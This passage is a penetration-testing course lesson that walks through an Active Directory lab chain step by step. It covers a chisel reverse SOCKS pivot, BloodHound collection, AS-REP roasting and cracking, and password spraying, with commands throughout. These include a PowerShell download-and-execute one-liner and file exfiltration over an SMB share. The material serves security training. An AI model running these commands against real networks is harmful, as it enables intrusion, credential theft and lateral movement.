
  
OSCP® Exam Prep CourseActive Directory Chains

Lesson 36 of 97

Completed

Start here8/8

Active Directory24/24

Active Directory Chains15/15

Chain 01: First ContactBuild a solid foundation for attacking Active Directory environments.Chain 02: StolenDevelop reliable credential access and lateral movement techniques.Chain 03: BleedWideExpand domain access through coordinated AD attacks and spraying.Chain 04: Inside JobLeverage pivoting to reach vulnerable services inside AD networks.Chain 05: GroupThinkPerform network pivoting and abuse misconfigured Group Policies to extend and maintain control.Chain 06: TrustfallShape misconfigurations and open services into borrowed authority.Chain 07: CrosslinkAbuse trusted access, traverse isolated networks, and escalate across hidden infrastructure.Chain 08: RicochetAbuse injectable endpoints, bypass their defense, and relay it across the domain to seize control.Chain 09: BloodhuntMap the hidden edges, and abuse what others overlook. Only the certified will be let through.Chain 10: ReplicantFollow the unseen edges, migrate into a living process, and make the controller surrender every secret.Chain 11: Cold StorageEscalate through a task, comb the host for credentials, and crack any encryption in your way.Chain 12: DelegateRun as the account left in the open, crack what the cache remembers, then delegate the rights to domain compromise.Chain 13: FailsafeDecrypt a GPP password, crack two vaults, and ride a WriteDacl edge to Domain Admin.Chain 14: Open RelayLeak a credential from SNMP, seize the Spooler for SYSTEM, then relay and reset your way to the domain.Chain 15: OverwriteHop a SQL linked server, loot LSA secrets twice, and reset an account to own the domain.

Initial Access17/17

Privilege Escalation15/15

Pivoting and Tunneling6/6

The Exam5/5

Notes and extras7/7

Lab

AD Chain_04

A domain controller and two Windows clients. Runs on your own machine. The download is sold in the shop, separate from membership, and is yours to keep.

[Get this chain](https://buymeacoffee.com/hackacademy/e/491283)[About this chain](https://hackerblueprint.com/labs#chain-04)[All chains bundle](https://buymeacoffee.com/hackacademy/e/582690)

Not startedStartedRooted

Wrote a walkthrough?

We'd love to see how you took this chain! Written up or on video, both are great. Email it to us and we'll take a look.

[Email your walkthrough](mailto:hacking.academy@protonmail.com?subject=Walkthrough%3A%20Chain%2004%3A%20Inside%20Job)

Tags

SMB EnumerationPivotingPassword ReuseAD EnumerationWindows PrivescData ExfiltrationAS-REP RoastingReport Writing

PreviousCompletedNext: Chain 05: GroupThinkContinue

Chat  
and notesHelp[Ideas](https://discord.com/channels/1325919248954167468/1325966774881226862)

## Chain 04: Inside Job

Step 1 of 18

Close

0:00 / 1:11:38

Auto

1

Pick up the chain and sweep the subnet

BackNext step

Your lab addressesYour IPCLIENT-1 IPOur subnetInternal networkCLIENT-2 IPDC01 IP

1. 1Pick up the chain and sweep the subnet_0:00_
    
    The lab gives us a working folder with one file in it, a username and password for the domain. We read it, check where our own machine sits, then sweep the subnet for hosts that answer on SMB and RDP.
    
    One domain-joined machine answers, CLIENT-1 at `TARGET_IP`, with SMB and RDP open. A second RDP host replies with its own workgroup name instead of the domain, so it is not part of hack-academy.local and we leave it alone.
    
    Kali
    
    ```
    ll
    ```
    
    Copy
    
    Lists the working directory. It holds a single file, starting_credentials.txt.
    
    **Why**We start by seeing exactly what the lab provides, so nothing is assumed.
    
    Kali
    
    ```
    cat starting_credentials.txt
    ```
    
    Copy
    
    Prints the file. It holds one line in the form user,password: `lcarter,Awesome!`.
    
    **Why**These two values are the whole starting position of the chain, so every later step is built on them.
    
    Kali
    
    ```
    ip route
    ```
    
    Copy
    
    Shows the routing table: the default gateway of the lab network, and our interface address `YOUR_IP` on `ATTACK_NET`.
    
    **Why**Our own address and subnet are what let us read the sweep results and build URLs back to our machine later.
    
    Kali
    
    ```
    ip a
    ```
    
    Copy
    
    Lists the interfaces. eth0 carries `YOUR_IP`; the docker bridges are DOWN and unused.
    
    **Why**Confirms one route into the lab, so every lateral step has to go through a host we already control.
    
    Kali
    
    ```
    netexec smb 10.0.0.0/24
    ```
    
    Copy
    
    Sweeps the subnet for SMB. For each reply netexec prints the host name, the domain or workgroup, and the Windows build.
    
    **Why**In an Active Directory lab the domain-joined machine answers on 445, so one sweep finds the target and names the domain.
    
    Kali
    
    ```
    netexec rdp 10.0.0.0/24
    ```
    
    Copy
    
    Repeats the sweep for RDP on port 3389 and shows the NLA setting of each host.
    
    **Why**RDP is the interactive way in, so we want to know which hosts allow it before trying a password.
    
    **Tip**Check the sweep output before scanning. The host that answers with a domain name is the one worth a full port scan.
    
2. 2Validate the credential and scan every port_1:36_
    
    Before anything else we check that the given password works, first over SMB for files and then over RDP for a desktop. Both answer with a success line, so the credential is confirmed and we have a way in.
    
    A full port scan then runs against the single host. It reports 135, 139, 445, 3389, 5040, 5357, 5985 and 49672 open: a normal Windows client with RDP and WinRM, and nothing that looks like a web application.
    
    Kali
    
    ```
    netexec smb 10.0.0.8 -u lcarter -p 'Awesome!'
    ```
    
    Copy
    
    Logs in to the target over SMB. A `[+]` line means the username and password are valid; `Pwn3d!` would mean local admin.
    
    **Why**One valid credential tells us the starting file is current and not a stale copy from another lab run.
    
    Kali
    
    ```
    netexec rdp 10.0.0.8 -u lcarter -p 'Awesome!'
    ```
    
    Copy
    
    Checks the same pair against RDP. `Pwn3d!` here means the account is allowed an interactive session.
    
    **Why**We want a desktop rather than a file share, because the next move is to inspect the machine's network interfaces.
    
    Kali
    
    ```
    nmap -p- -Pn 10.0.0.8 -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5
    ```
    
    Copy
    
    Scans all 65535 TCP ports. `-p-` is the full range, `-Pn` skips host discovery, `--min-rate 1000` keeps at least 1000 packets in flight, and the timeout and retry values stop a fast scan from giving up on a slow host.
    
    **Why**Everything after this is chosen from what is listening, so the scan has to be complete rather than a shortlist of common ports.
    
    **Tip**The RDP sweep already said the host answers on 3389. Reading that first saves a full scan of the whole subnet.
    
3. 3RDP in and find the second network_3:00_
    
    We open Remmina, point a new connection at `TARGET_IP`, and log in as lcarter with the same password. On the Windows desktop `ipconfig` and `Get-NetIPAddress` show two interfaces: one on `ATTACK_NET` and a second on `INTERNAL_NET`. Our machine has no route to that second network.
    
    To prove it, we sweep `INTERNAL_NET` for SMB from Kali and nothing answers. CLIENT-1 is the only way in, which makes it the pivot for everything that follows.
    
    Target (RDP)
    
    ```
    ipconfig
    ```
    
    Copy
    
    Shows both adapters: Ethernet has `PIVOT_IP` on the internal network, and Ethernet 2 has `TARGET_IP` on the network we came in over.
    
    **Why**Two addresses on two networks is the definition of a dual-homed host, and the second gateway tells us the internal range is real.
    
    Target (RDP)
    
    ```
    Get-NetIPAddress
    ```
    
    Copy
    
    Prints every address on the box, including loopback and IPv6 entries, in PowerShell's object form.
    
    **Why**We check for further interfaces that `ipconfig` might have hidden in a collapsed section.
    
    Target (RDP)
    
    ```
    Get-NetIPAddress | Select-Object InterfaceAlias,IPAddress,PrefixLength
    ```
    
    Copy
    
    The same data trimmed to three columns, which is the readable form for writing the addresses down.
    
    **Why**The prefix length is what proves the internal network is a /24 and not a wider range.
    
    Kali
    
    ```
    netexec smb 10.0.2.0/24
    ```
    
    Copy
    
    Tries an SMB sweep of the internal subnet directly from Kali. Nothing replies.
    
    **Why**Seeing the failure once is what tells us a tunnel is required, rather than a routing rule we could fix another way.
    
    **Tip**Write the two addresses of the pivot down against their interfaces. Sending traffic to the wrong one is the usual reason a tunnel looks broken.
    
4. 4Fetch chisel and serve it over HTTP_7:20_
    
    A pivot needs a binary on both ends. We work in a tools folder on Kali, clear out old copies, and download the chisel release for Linux and the one for Windows from the project's GitHub release page. The Linux build is unzipped with gzip, the Windows build with unzip.
    
    With both binaries ready we start a Python HTTP server in that folder, so the client can pull `chisel.exe` over the network we already reach. `ip a` just before it confirms `YOUR_IP` is the address to use in the download URL.
    
    Kali
    
    ```
    cd /opt/tools/privesc
    ```
    
    Copy
    
    Moves into the tools folder that holds what we transfer to Windows targets.
    
    **Why**Keeping the binaries and the HTTP server in one folder means the URL the client uses is short and predictable.
    
    Kali
    
    ```
    rm *
    ```
    
    Copy
    
    Deletes the files in the folder. zsh asks for a confirmation and the answer is y.
    
    **Why**Old copies of the same tools would otherwise be served to the target by mistake.
    
    Kali
    
    ```
    wget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_amd64.gz
    ```
    
    Copy
    
    Downloads the Linux build of chisel v1.11.3 from the release page.
    
    **Why**The Linux binary is the server half of the tunnel, so it runs on our machine.
    
    Kali
    
    ```
    gzip -d chisel_1.11.3_linux_amd64.gz
    ```
    
    Copy
    
    Decompresses the archive, leaving the executable `chisel` in the folder.
    
    **Why**The release ships gzipped, so it has to be unpacked before it can run.
    
    Kali
    
    ```
    wget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_windows_amd64.zip
    ```
    
    Copy
    
    Downloads the Windows build from the same release.
    
    **Why**The Windows binary is the client half, which the target will run to dial back to us.
    
    Kali
    
    ```
    unzip chisel_1.11.3_windows_amd64.zip
    ```
    
    Copy
    
    Extracts `chisel.exe` next to the Linux binary.
    
    **Why**The client cannot run from inside the zip, and the HTTP server can only serve a real file.
    
    Kali
    
    ```
    rm chisel_1.11.3_windows_amd64.zip
    ```
    
    Copy
    
    Removes the zip once it is unpacked.
    
    **Why**Leaves one file to serve and keeps the folder listing readable.
    
    Kali
    
    ```
    ip a
    ```
    
    Copy
    
    Prints the interfaces again, confirming `YOUR_IP` on eth0.
    
    **Why**The download URL on the target has to point at our address, so we check it here rather than guess.
    
    Kali
    
    ```
    python3 -m http.server 80
    ```
    
    Copy
    
    Serves the current folder over HTTP on port 80.
    
    **Why**A plain HTTP server is the smallest way to hand a binary to a Windows box that can reach us on this network.
    
    **Tip**Port 80 needs root. If the server refuses to start, the shell is not root, or something else already holds the port.
    
5. 5Open a reverse SOCKS tunnel through CLIENT-1_9:20_
    
    On the Windows box we change into a writable folder and pull `chisel.exe` from our HTTP server. On Kali, `/etc/proxychains4.conf` is edited so the proxy list points at the SOCKS port chisel will open, and the chisel server is started in reverse mode on 8081.
    
    We then run the client on the target with `R:socks`, which makes chisel open a SOCKS proxy on our machine and carry the traffic back through CLIENT-1. From that point every command aimed at `INTERNAL_NET` is prefixed with proxychains. The prefix is the whole trick: without it the tools try to reach the internal addresses directly and fail.
    
    Target (RDP)
    
    ```
    cd c:\windows\tasks
    ```
    
    Copy
    
    Moves into C:\windows\tasks, a folder the account can write to.
    
    **Why**Dropped tools belong in a writable folder, and this one is used throughout the chain for exactly that.
    
    Target (RDP)
    
    ```
    wget 10.0.0.6/chisel.exe -o chisel.exe
    ```
    
    Copy
    
    Downloads chisel.exe from our HTTP server. In PowerShell `wget` is an alias for Invoke-WebRequest, and `-o` is `-OutFile`.
    
    **Why**The client half has to run on CLIENT-1, because that is the machine with an address on the internal network.
    
    Kali (/etc/proxychains4.conf)
    
    ```
    socks5 127.0.0.1 1080
    ```
    
    Copy
    
    The line added to the end of the proxy list: type socks5, address 127.0.0.1, port 1080. It replaces the default `socks4 127.0.0.1 9050` line.
    
    **Why**proxychains only forwards what its proxy list names, and chisel will open its SOCKS port on 1080.
    
    Kali
    
    ```
    ./chisel server -p 8081 --reverse
    ```
    
    Copy
    
    Starts chisel as a server on port 8081. `--reverse` allows the client to ask for a remote port forward, which is how the SOCKS proxy ends up on our side.
    
    **Why**Running it with `./` is needed because the binary sits in the current folder and is not on PATH. Typing `chisel` alone gives command not found.
    
    Kali
    
    ```
    ss -lntu
    ```
    
    Copy
    
    Lists listening TCP and UDP sockets. Port 8081 shows as listening once the server is up.
    
    **Why**We confirm the server is really bound before starting the client, so a failed connection can only be the client side.
    
    Target (RDP)
    
    ```
    .\chisel.exe client 10.0.0.6:8081 R:socks
    ```
    
    Copy
    
    Runs the client on the target and connects back to our server. `R:socks` asks the server to expose a SOCKS proxy, which appears on 127.0.0.1:1080 on Kali.
    
    **Why**This is the reverse direction that matters: the target dials out, so no inbound rule has to exist on the internal network.
    
    **Tip**If the shell on the target drops, the tunnel dies with it. Re-running the client command restores the same SOCKS port without touching the server.
    
6. 6Reach the domain through the tunnel_13:24_
    
    The internal sweep now returns hosts: DC01 at `DC_IP`, CLIENT-2 at `CLIENT2_IP`, the pivot's own internal address `PIVOT_IP`, and one more desktop. A plain `netexec smb INTERNAL_NET` still fails, because it is not going through the proxy, but the same command behind proxychains answers at once.
    
    We confirm the credential on the domain controller and ask for the domain user list. Then netexec's BloodHound collector is run over LDAP against `DC_IP` alone, with `--dns-tcp`, and the resulting zip is copied out of the netexec logs folder for the app to ingest.
    
    Kali
    
    ```
    proxychains -q netexec smb 10.0.2.0/24
    ```
    
    Copy
    
    Sweeps the internal subnet for SMB, with all traffic sent through the SOCKS tunnel. `-q` hides proxychains' own connection messages.
    
    **Why**This is the proof that the pivot works: the same sweep that failed earlier now finds three domain hosts.
    
    Kali
    
    ```
    proxychains -q netexec smb 10.0.2.0/24 -u lcarter -p 'Awesome!' --users
    ```
    
    Copy
    
    Authenticates across the discovered hosts and lists the domain users from each that allows it.
    
    **Why**We want the full account list before trying anything else; it is also how we learn which hosts accept the credential.
    
    Kali
    
    ```
    proxychains -q netexec ldap 10.0.2.4 -u lcarter -p 'Awesome!' --bloodhound --dns-server 10.0.2.4 --dns-tcp
    ```
    
    Copy
    
    Runs netexec's BloodHound collector over LDAP against the domain controller, writing a zip of JSON files. `--dns-server` points name resolution at the DC and `--dns-tcp` forces DNS over TCP.
    
    **Why**DNS normally goes over UDP, which a SOCKS proxy cannot carry, so `--dns-tcp` is what makes the collection work through the tunnel. Without it the run hangs and times out.
    
    Kali
    
    ```
    cp /root/.nxc/logs/DC01_10.0.2.4_2025-12-16_191626_bloodhound.zip /tmp
    ```
    
    Copy
    
    Copies the collection zip from netexec's log folder into /tmp, where the BloodHound file picker opens.
    
    **Why**The upload dialog starts in /tmp, so putting the zip there saves hunting for a path written by another tool.
    
    **Tip**The BloodHound flag exists on the ldap module, not on smb. Running it against smb returns an unrecognized argument error, and pointing it at the whole /24 fails because the collector needs one domain controller.
    
7. 7Start BloodHound CE and log in_15:52_
    
    BloodHound Community Edition runs as a set of containers. We fetch its compose file, pull the images, and start it. The app generates an initial admin password on the first start, and the only place to read it is the container log, which is why the start is followed by a grep for the word password.
    
    The web interface then opens at [http://localhost:8080](http://localhost:8080/). We log in as `admin` with the generated password, and BloodHound forces a new password on the first login before it shows the graph.
    
    Kali
    
    ```
    curl -L https://ghst.ly/getbhce -o docker-compose.yml
    ```
    
    Copy
    
    Downloads the community edition compose file. `-L` follows the redirect from the short link and `-o` writes it to docker-compose.yml.
    
    **Why**Running the official compose file keeps the database and app versions matched, which saves a long debugging session.
    
    Kali
    
    ```
    docker-compose pull && docker-compose up -d
    ```
    
    Copy
    
    Pulls the graph database, the app database and the BloodHound image, then starts all six containers detached.
    
    **Why**BloodHound needs both databases before the interface will accept a login, so the whole stack comes up at once.
    
    Kali
    
    ```
    docker-compose logs bloodhound | grep -i passw
    ```
    
    Copy
    
    Reads the app container log and keeps only the lines that mention a password. The generated admin password is printed there on first start.
    
    **Why**The initial password is random per install, so this line is the only way to get it without resetting the container.
    
    **Tip**The password line appears once, on the first start. If it scrolled past, `docker-compose logs bloodhound` again will not bring it back after the volume is created.
    
8. 8Enumerate CLIENT-1 as lcarter_16:56_
    
    Back on the RDP session we look at what lcarter can do locally. `whoami /all` shows a standard user without a useful privilege, so there is no quick token abuse here.
    
    A PowerUp one-liner loads the script straight into memory and runs every check. On this host it reports a writable folder in the user's PATH, which we note and leave alone: the chain turns on a domain account rather than a local flaw. `netstat` then confirms the box only exposes the ports we already know, 445, 3389 and 5985.
    
    Target (RDP)
    
    ```
    ipconfig
    ```
    
    Copy
    
    Shows the two adapters again, so the addresses are on screen while we work.
    
    **Why**Every command in this session has to be aimed at the right network, and re-reading the address avoids sending internal traffic out of the wrong NIC.
    
    Target (RDP)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints the user, the groups and every privilege with its state. lcarter is in BUILTIN\Remote Desktop Users and Remote Interactive Logon, with only the standard privileges enabled.
    
    **Why**No SeImpersonate and no admin group means local privilege escalation will not come from a potato or a service in this session.
    
    Target (RDP)
    
    ```
    powershell.exe -c "wget -useb https://raw.githubusercontent.com/punishell/ADCheatSheet/refs/heads/master/PowerUp.ps1 | iex; Invoke-AllChecks"
    ```
    
    Copy
    
    Downloads PowerUp.ps1 and pipes it into `iex` so it runs in memory, then calls every check with `Invoke-AllChecks`.
    
    **Why**Downloading to disk would leave a script on the host and may trip the local defences; the in-memory form is both faster and quieter.
    
    Target (RDP)
    
    ```
    netstat -ano | findstr /i liste
    ```
    
    Copy
    
    Lists listening sockets and their process IDs, filtered to lines containing `liste`. It shows 135, 445, 3389, 5040, 5357, 5985, 47001 and high RPC ports on both addresses.
    
    **Why**A locally listening port that the scan did not see would be a clue to an internal-only service. Here there is nothing new.
    
    **Tip**PowerUp prints a lot. Read the AbuseFunction lines first: they name the action it would take, and that is what tells you whether the finding is usable or noise.
    
9. 9Check the credential on every protocol_19:36_
    
    The same username and password are now tried over each protocol that matters, through the tunnel. SMB answers on the domain controller and on both clients, RDP answers with `Pwn3d!` on CLIENT-1, and WinRM refuses everywhere.
    
    That is a useful map: the credential is a domain credential, it can open an interactive session on the machine we already hold, and it will not give a remote PowerShell shell anywhere.
    
    Kali
    
    ```
    proxychains -q netexec smb 10.0.2.0/24 -u lcarter -p 'Awesome!'
    ```
    
    Copy
    
    Logs in to every host in the internal range over SMB with the given credential.
    
    **Why**A credential that is valid on the domain controller is worth far more than one that only opens a single client.
    
    Kali
    
    ```
    proxychains -q netexec winrm 10.0.2.0/24 -u lcarter -p 'Awesome!'
    ```
    
    Copy
    
    Tries the same pair over WinRM on port 5985. The logins fail, though the hosts do answer on the port.
    
    **Why**WinRM would give a command shell without a desktop, so it is worth one check before going back to RDP.
    
    Kali
    
    ```
    proxychains -q netexec rdp 10.0.2.0/24 -u lcarter -p 'Awesome!'
    ```
    
    Copy
    
    Tries the pair over RDP. CLIENT-1 comes back `Pwn3d!` and CLIENT-2 accepts the credential with a plain `[+]`.
    
    **Why**Two usable desktops in the internal network is the next platform for enumeration.
    
    **Tip**Run the three protocols in the same order every time. The results then line up between hosts and a single refusal is easy to spot.
    
10. 10Collect from inside with SharpHound_21:52_
    
    The collection from outside only saw what LDAP exposes. To get sessions, local groups and logged-on users we collect from a machine inside the domain, so the tunnel goes back up and SharpHound is pulled onto CLIENT-1.
    
    `SharpHound.exe -c All` writes a timestamped zip into C:\windows\tasks. Getting it back is its own step: we start an impacket SMB server on Kali, map it from the Windows box with `net use`, and copy the zip across.
    
    The zip is then uploaded in the BloodHound interface through Explore and the upload panel, and ingested into the same graph as the LDAP collection.
    
    Kali
    
    ```
    ./chisel server -p 8081 --reverse
    ```
    
    Copy
    
    Restarts the chisel server after the earlier one stopped.
    
    **Why**The tunnel had dropped, and nothing internal is reachable until it is back.
    
    Target (RDP)
    
    ```
    wget 10.0.0.6/chisel.exe -o chisel.exe
    ```
    
    Copy
    
    Pulls chisel.exe again from the HTTP server.
    
    **Why**The client may have been removed with the tasks folder cleanup, and re-downloading costs a second.
    
    Target (RDP)
    
    ```
    .\chisel.exe client 10.0.0.6:8081 R:socks
    ```
    
    Copy
    
    Reopens the reverse SOCKS proxy on 127.0.0.1:1080.
    
    **Why**The rest of the chain, including the collection upload, runs through this proxy.
    
    Kali
    
    ```
    cp /home/kali/Downloads/sharphound-v2.8.1.zip .
    ```
    
    Copy
    
    Copies the SharpHound release zip into the tools folder that the HTTP server is serving.
    
    **Why**The Windows box can only pull what sits in that folder.
    
    Kali
    
    ```
    unzip sharphound-v2.8.1.zip
    ```
    
    Copy
    
    Extracts SharpHound.exe from the release zip.
    
    **Why**The exe has to exist as a file before it can be served.
    
    Kali
    
    ```
    python3 -m http.server 80
    ```
    
    Copy
    
    Serves the tools folder again on port 80.
    
    **Why**The earlier server was closed when the shell that started it went away.
    
    Target (RDP)
    
    ```
    wget 10.0.0.6/SharpHound.exe -o SharpHound.exe
    ```
    
    Copy
    
    Downloads SharpHound.exe onto CLIENT-1. If the HTTP server is not running yet, this is the command that fails with `Unable to connect to the remote server`.
    
    **Why**SharpHound has to run inside the domain so the collector can read sessions and local groups from the hosts.
    
    Target (RDP)
    
    ```
    .\SharpHound.exe -c All
    ```
    
    Copy
    
    Runs every collection method and writes a zip named with the date and time into the current folder.
    
    **Why**All collection methods in one pass is one upload instead of several, and the sessions data is what the later queries depend on.
    
    Kali
    
    ```
    impacket-smbserver -smb2support share .
    ```
    
    Copy
    
    Starts an SMB server in the current folder, sharing it as `share`, with SMB2 support so current Windows clients can mount it.
    
    **Why**A share is the simplest way to get a file off a Windows box when the target can reach us on a network we control.
    
    Target (RDP)
    
    ```
    net use \\10.0.0.6\share
    ```
    
    Copy
    
    Maps our SMB share in the Windows session. It answers `The command completed successfully.`
    
    **Why**Mapping first means the copy step is a plain file copy, which is easier to read than a UNC path with a password.
    
    Target (RDP)
    
    ```
    net use
    ```
    
    Copy
    
    Lists the mapped drives and shares and confirms the `\\YOUR_IP\share` mapping is present.
    
    **Why**A silent failure here is common, and one listing saves debugging the copy later.
    
    Target (RDP)
    
    ```
    copy .\20251216113138_BloodHound.zip \\10.0.0.6\share
    ```
    
    Copy
    
    Copies the collection zip into the share on Kali. `copy` handles the UNC path directly, so no drive letter is needed.
    
    **Why**The zip has to reach the app, and the tunnel does not carry an inbound file upload to our machine.
    
    **Tip**The zip name carries the collection time. Keep it, because BloodHound lists sessions by that name and two collections from the same host look identical otherwise.
    
11. 11Read the graph for the way forward_28:00_
    
    With both collections ingested, the queries in the Cypher tab answer the questions that decide the next move. `All Domain Admins` lists the group and shows that lcarter is not in it, `Kerberoastable Users` marks accounts with a service principal name, and `AS-REP Roastable users (DontReqPreAuth)` returns one account, csanders.
    
    We also open the lcarter node itself to see its local group memberships and its sessions. The picture is a small domain with three machines, one ordinary user credential, and a second account that can be attacked offline without any further access.
    
    **Tip**Run the roastable queries before picking a technique. An account with pre-authentication disabled is the cheapest attack in Active Directory, and the graph answers it in one click.
    
12. 12AS-REP roast csanders and crack it_30:40_
    
    csanders has Kerberos pre-authentication disabled, so the domain controller will hand out an AS-REP encrypted with that account's key to anyone who asks. netexec asks over LDAP from Kali and writes the hash to a file; the same job is done from inside the domain with Rubeus, which needs no credential at all.
    
    The hash comes back to Kali over the SMB share and john cracks it against rockyou. The password is `*Gillian*`, asterisks included. That is a domain account we can now use everywhere, and the next step is to find which hosts accept it.
    
    Kali
    
    ```
    proxychains -q netexec ldap 10.0.2.4 -u lcarter -p 'Awesome!' --asrep a --dns-server 10.0.2.4
    ```
    
    Copy
    
    Roasts every account with pre-authentication disabled and writes the hashes to the file named `a`. Only csanders comes back. netexec accepts `--asrep` as a shortening of `--asreproast`.
    
    **Why**This is the offline half of Kerberos abuse: one request, one hash, and no failed logon to alert on. It has to run behind proxychains, because a direct run has no route to `DC_IP` and hangs.
    
    Kali
    
    ```
    ss -lntp
    ```
    
    Copy
    
    Lists listening sockets with the program names. It shows 127.0.0.1:1080 from chisel and the chisel server on 8082.
    
    **Why**Before pushing a binary to the host we confirm the tunnel and the server are still up, since everything after this depends on both.
    
    Kali
    
    ```
    wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
    ```
    
    Copy
    
    Downloads a compiled Rubeus build from the Ghostpack compiled binaries repository.
    
    **Why**Rubeus can roast from the Windows side, which is useful when the LDAP route is blocked or when the far side has the accounts we need.
    
    Kali
    
    ```
    python3 -m http.server 80
    ```
    
    Copy
    
    Serves the folder that now holds Rubeus.exe.
    
    **Why**The host needs a way to pull the binary, and our HTTP server is already the pattern in use.
    
    Target (RDP)
    
    ```
    .\Rubeus.exe asreproast /outfile:hashes.txt
    ```
    
    Copy
    
    Runs Rubeus in AS-REP roasting mode as the lcarter session and writes the result to hashes.txt. Rubeus prints the target domain, hack-academy.local, and the account name csanders.
    
    **Why**Roasting from inside shows that the attack needs no special position: any account on a domain-joined host can request the same data.
    
    Target (RDP)
    
    ```
    .\Rubeus.exe asreproast
    ```
    
    Copy
    
    Runs the same roast without an output file and prints the `$krb5asrep$` hash to the console.
    
    **Why**Useful when you want the hash in front of you to paste into a note. Each run uses a new nonce, so the value differs from the earlier one.
    
    Target (RDP)
    
    ```
    cat .\hashes.txt
    ```
    
    Copy
    
    Prints the file Rubeus wrote, showing the `$krb5asrep$csanders@hack-academy.local:` hash.
    
    **Why**We check the file really holds one complete hash before moving it, rather than assuming the roast wrote what we expect.
    
    Target (RDP)
    
    ```
    copy .\hashes.txt \\10.0.0.6\share\
    ```
    
    Copy
    
    Copies the hash file into our SMB share. The trailing backslash names the folder rather than a new file name.
    
    **Why**john runs on Kali, and this is the shortest path back across the pivot.
    
    Kali
    
    ```
    cat hashes.txt
    ```
    
    Copy
    
    Prints the copied file on our side and confirms the hash arrived intact.
    
    **Why**A truncated hash fails to load in john, and checking now is faster than reading a parser error later.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
    ```
    
    Copy
    
    Cracks the AS-REP hash with rockyou.txt. john detects `krb5asrep` by itself; the result is `*Gillian*` for csanders.
    
    **Why**The password is the goal: with it we hold a second domain account that the collection says has no obvious restriction.
    
    **Tip**The `--asrep` option exists on the ldap module only. Run against smb it fails with `unrecognized arguments`, and run without proxychains it hangs with no route to the domain controller.
    
13. 13Spray the new password across the subnet_35:40_
    
    Spraying by hand is a typo waiting to happen, so both lists are built first. The user list comes from LDAP, with the banner lines and the column header stripped so only names remain. The password file holds the two passwords we now hold: the cracked `*Gillian*` and the original `Awesome!`.
    
    The internal range is then swept once to get a clean host list, which goes into a file called `ips`. netexec accepts both files in place of `-u` and `-p`, so one command tries every pair on every host, and `--continue-on-success` keeps it running after a hit instead of stopping.
    
    SMB gives us the important line: csanders with `*Gillian*` on `DC_IP`. WinRM comes back empty. The RDP run then finds the same account on CLIENT-2, which is the host we want next.
    
    Kali
    
    ```
    gedit pass&
    ```
    
    Copy
    
    Opens a file called `pass` in gedit, in the background so the shell prompt comes back. Two lines are typed: `*Gillian*` and `Awesome!`.
    
    **Why**netexec takes a file name for `-p`, so the known passwords go in one file that can be reused for every protocol and host.
    
    Kali
    
    ```
    cat starting_credentials.txt
    ```
    
    Copy
    
    Prints the starting credential again for the password file.
    
    **Why**Copying the exact string avoids a capital letter slip that would look like a failed login on every host.
    
    Kali
    
    ```
    proxychains -q netexec ldap 10.0.2.4 -u lcarter -p 'Awesome!' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee users
    ```
    
    Copy
    
    Dumps the domain users over LDAP, drops the log and header lines, takes the fifth column, the account name, and saves the list to `users` while showing it. It returns Administrator, Guest, krbtgt, lcarter, jbrooks, mdoyle, tgibson, oparker, csanders, rcooper, amorgan, nadams and hgrant.
    
    **Why**A plain text list of accounts is what the spray needs, and building it from the directory keeps it complete instead of guessed.
    
    Kali
    
    ```
    proxychains -q netexec ldap 10.0.2.4 -u users -p pass --continue-on-success
    ```
    
    Copy
    
    A first pass against the domain controller with both files, over LDAP.
    
    **Why**Testing the files on one host proves the syntax before the same idea is fired at every machine.
    
    Kali
    
    ```
    proxychains -q netexec ldap 10.0.2.0/24
    ```
    
    Copy
    
    Sweeps the internal range for LDAP and is stopped with Ctrl+C once DC01 answers.
    
    **Why**Only the domain controller speaks LDAP, so one reply is enough and the sweep can be cut short.
    
    Kali
    
    ```
    proxychains -q netexec smb 10.0.2.0/24
    ```
    
    Copy
    
    Sweeps the internal range for SMB and is stopped once four hosts are listed.
    
    **Why**The host list for the spray has to include every machine, not just the three already known.
    
    Kali
    
    ```
    gedit ips
    ```
    
    Copy
    
    Opens a file called `ips` holding the hosts to spray: `PIVOT_IP`, `CLIENT2_IP`, `DC_IP` and the out-of-domain desktop.
    
    **Why**A file of targets means the same spray can be repeated against a changed list without retyping addresses.
    
    Kali
    
    ```
    proxychains -q netexec smb ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Tries every user and password pair over SMB on every host in `ips`. csanders with `*Gillian*` succeeds on `DC_IP`; every other pair fails with STATUS_LOGON_FAILURE.
    
    **Why**One valid pair across the whole subnet is what turns a cracked hash into a usable domain account.
    
    Kali
    
    ```
    proxychains -q netexec winrm ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Repeats the spray over WinRM on port 5985. Nothing succeeds.
    
    **Why**WinRM would be the fastest route to a shell, so it is checked before spending time on desktops.
    
    Kali
    
    ```
    proxychains -q netexec winrm ips -u users -p pass --continue-on-success > spray_winrm
    ```
    
    Copy
    
    Runs the same WinRM spray again and redirects the output into a file called `spray_winrm`.
    
    **Why**Saving the output keeps the host banners, which show which machines listen on 5985 even when no login works.
    
    Kali
    
    ```
    cat spray_winrm | fgrep -v '[-]'
    ```
    
    Copy
    
    Shows the saved output with the failure lines removed, leaving the CLIENT-1, CLIENT-2 and DC01 banners.
    
    **Why**Reading only the positive lines turns a long file into a short list of hosts that expose WinRM.
    
    Kali
    
    ```
    proxychains -q netexec rdp ips -u users -p pass --continue-on-success > spray_winrm
    ```
    
    Copy
    
    Repeats the spray over RDP and writes the output to the same file, replacing the WinRM capture. csanders is valid on CLIENT-2.
    
    **Why**RDP is how we get an interactive session without WinRM, and one hit here is enough to continue.
    
    **Tip**`--continue-on-success` is what stops netexec at the first hit when you leave it out. For a spray you always want it on, unless you only care whether one specific pair works.
    
14. 14Scan through the proxy and RDP into CLIENT-2_40:10_
    
    A scan of CLIENT-2 from Kali fails three times before it works, and the reason is the proxy. A default nmap scan sends raw packets, which never enter the SOCKS tunnel, so the host looks down. `-Pn` on its own is not enough: the scan has to be a full TCP connect scan with `-sT` before proxychains can relay it.
    
    With the ports confirmed we open a desktop on CLIENT-2 as csanders, using xfreerdp over proxychains. The certificate warning is skipped and the clipboard and window resizing are switched on so the session behaves like a local desktop.
    
    Kali
    
    ```
